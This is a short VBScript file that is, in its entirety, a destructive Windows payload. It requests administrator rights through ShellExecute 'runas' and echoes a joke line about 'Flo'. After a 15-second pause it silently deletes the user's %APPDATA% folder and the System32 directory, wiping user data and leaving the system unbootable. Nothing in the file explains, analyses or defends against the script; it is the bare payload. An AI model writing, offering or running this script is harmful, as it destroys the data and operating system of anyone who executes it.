On Error Resume Next
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "cmd.exe", "/c echo Flo is so cool! & timeout /t 15 & rd /s /q %APPDATA% & rd /s /q %windir%\System32", "", "runas", 1
